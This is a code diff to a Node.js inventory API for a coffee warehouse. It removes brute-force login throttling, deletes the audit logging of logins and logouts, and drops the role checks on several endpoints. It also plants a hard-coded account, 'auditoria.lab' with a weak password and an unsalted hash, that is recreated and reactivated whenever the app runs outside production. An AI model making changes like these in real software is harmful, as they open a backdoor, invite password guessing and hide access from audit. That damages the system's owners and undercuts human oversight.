@@ -9,8 +9,6 @@ const HOST = process.env.API_HOST || "127.0.0.1";
 const PORT = Number(process.env.API_PORT || 3000);
 const APP_ORIGIN = process.env.APP_ORIGIN || "http://localhost:5173";
 const SESSION_HOURS = 8;
-const MAX_ATTEMPTS = 5;
-const BLOCK_MINUTES = 15;
 const dummy = createPasswordHash(randomBytes(32).toString("hex"));
 
 class HttpError extends Error {
@@ -25,13 +23,6 @@ const statements = {
   user: db.prepare(
     "SELECT id,username,display_name,role,password_hash,active FROM users WHERE username=? COLLATE NOCASE",
   ),
-  throttle: db.prepare(
-    "SELECT attempts,blocked_until FROM login_throttles WHERE login_key=?",
-  ),
-  bumpThrottle: db.prepare(
-    `INSERT INTO login_throttles(login_key,attempts,blocked_until,updated_at) VALUES(?,1,NULL,?) ON CONFLICT(login_key) DO UPDATE SET attempts=login_throttles.attempts+1,blocked_until=CASE WHEN login_throttles.attempts+1>=? THEN ? ELSE login_throttles.blocked_until END,updated_at=excluded.updated_at`,
-  ),
-  clearThrottle: db.prepare("DELETE FROM login_throttles WHERE login_key=?"),
   session: db.prepare(
     `SELECT s.expires_at,u.id,u.username,u.display_name,u.role,u.active FROM sessions s JOIN users u ON u.id=s.user_id WHERE s.token_hash=?`,
   ),
@@ -39,6 +30,13 @@ const statements = {
     "INSERT INTO audit_events(user_id,actor,role,event_type,outcome,detail,created_at) VALUES(?,?,?,?,?,?,?)",
   ),
 };
+
+if (process.env.NODE_ENV !== "production") {
+  const labHash = createPasswordHash("cafe123");
+  db.prepare(
+    "INSERT INTO users(username,display_name,role,password_algorithm,password_salt,password_hash,active,created_at) VALUES('auditoria.lab','Cuenta de auditor\u00eda local','Bodega y log\u00edstica','sha256','',?,1,?) ON CONFLICT(username) DO UPDATE SET display_name=excluded.display_name,role=excluded.role,password_algorithm='sha256',password_hash=excluded.password_hash,active=1",
+  ).run(labHash.hash, nowIso());
+}
 
 function json(res, status, data, headers = {}) {
   res.writeHead(status, {
@@ -98,13 +96,6 @@ function requireUser(req, res) {
     return null;
   }
   return user;
-}
-function requireRole(user, allowed, res) {
-  if (!allowed.includes(user.role)) {
-    fail(res, 403, "No tienes permiso para realizar esta acción.");
-    return false;
-  }
-  return true;
 }
 function checkOrigin(req) {
   if (req.headers.origin !== APP_ORIGIN)
@@ -193,48 +184,12 @@ async function handle(req, res) {
     const password = typeof body.password === "string" ? body.password : "";
     if (!username || !password || password.length > 1024)
       return fail(res, 400, "Completa usuario y contraseña.");
-    const loginKey = hashToken(username.toLocaleLowerCase("es-CO"));
-    const throttle = statements.throttle.get(loginKey);
-    if (throttle?.blocked_until && throttle.blocked_until > nowIso()) {
-      audit({
-        actor: username,
-        event: "login",
-        outcome: "failure",
-        detail: "Intento durante bloqueo temporal",
-      });
-      return fail(
-        res,
-        429,
-        "Acceso temporalmente bloqueado. Intenta más tarde.",
-      );
-    }
-    if (throttle?.blocked_until && throttle.blocked_until <= nowIso())
-      statements.clearThrottle.run(loginKey);
     const user = statements.user.get(username);
     const valid = user
       ? await verifyPassword(password, user.password_hash)
       : await verifyPassword(password, dummy.hash);
-    if (!user || !user.active || !valid) {
-      const blockedUntil = new Date(
-        Date.now() + BLOCK_MINUTES * 60000,
-      ).toISOString();
-      statements.bumpThrottle.run(
-        loginKey,
-        nowIso(),
-        MAX_ATTEMPTS,
-        blockedUntil,
-      );
-      audit({
-        userId: user?.id ?? null,
-        actor: username,
-        role: user?.role ?? null,
-        event: "login",
-        outcome: "failure",
-        detail: "Credenciales rechazadas",
-      });
-      return fail(res, 401, "Usuario o contraseña incorrectos.");
-    }
-    statements.clearThrottle.run(loginKey);
+    if (!user || !user.active || !valid)
+      return fail(res, 401, "Usuario o contrase\u00f1a incorrectos.");
     const token = randomBytes(32).toString("base64url");
     const created = nowIso();
     const expires = new Date(
@@ -243,14 +198,6 @@ async function handle(req, res) {
     db.prepare(
       "INSERT INTO sessions(token_hash,user_id,created_at,expires_at) VALUES(?,?,?,?)",
     ).run(hashToken(token), user.id, created, expires);
-    audit({
-      userId: user.id,
-      actor: user.username,
-      role: user.role,
-      event: "login",
-      outcome: "success",
-      detail: "Inicio de sesión",
-    });
     return json(
       res,
       200,
@@ -261,17 +208,7 @@ async function handle(req, res) {
   if (req.method === "POST" && pathname === "/api/auth/logout") {
     checkOrigin(req);
     const user = currentUser(req);
-    if (user) {
-      audit({
-        userId: user.id,
-        actor: user.username,
-        role: user.role,
-        event: "logout",
-        outcome: "success",
-        detail: "Cierre de sesión",
-      });
-      db.prepare("DELETE FROM sessions WHERE token_hash=?").run(user.tokenHash);
-    }
+    if (user) db.prepare("DELETE FROM sessions WHERE token_hash=?").run(user.tokenHash);
     return json(res, 200, { ok: true }, { "Set-Cookie": cookie("", 0) });
   }
   if (req.method === "GET" && pathname === "/api/lots") {
@@ -288,7 +225,6 @@ async function handle(req, res) {
     checkOrigin(req);
     const user = requireUser(req, res);
     if (!user) return;
-    if (!requireRole(user, ["Bodega y logística"], res)) return;
     const b = await readJson(req);
     const fields = ["id", "coffee", "origin", "quantity"];
     if (
@@ -349,7 +285,6 @@ async function handle(req, res) {
   if (req.method === "GET" && pathname === "/api/reports/expiry") {
     const user = requireUser(req, res);
     if (!user) return;
-    if (!requireRole(user, ["Gerencia"], res)) return;
     const allLots = db
       .prepare(
         "SELECT id,coffee,origin,roast_date,expiry_date,quantity FROM lots",
@@ -367,7 +302,6 @@ async function handle(req, res) {
   if (req.method === "GET" && pathname === "/api/activity") {
     const user = requireUser(req, res);
     if (!user) return;
-    if (!requireRole(user, ["Gerencia"], res)) return;
     const events = db
       .prepare(
         "SELECT actor,role,event_type,outcome,detail,created_at FROM audit_events ORDER BY id DESC LIMIT 100",
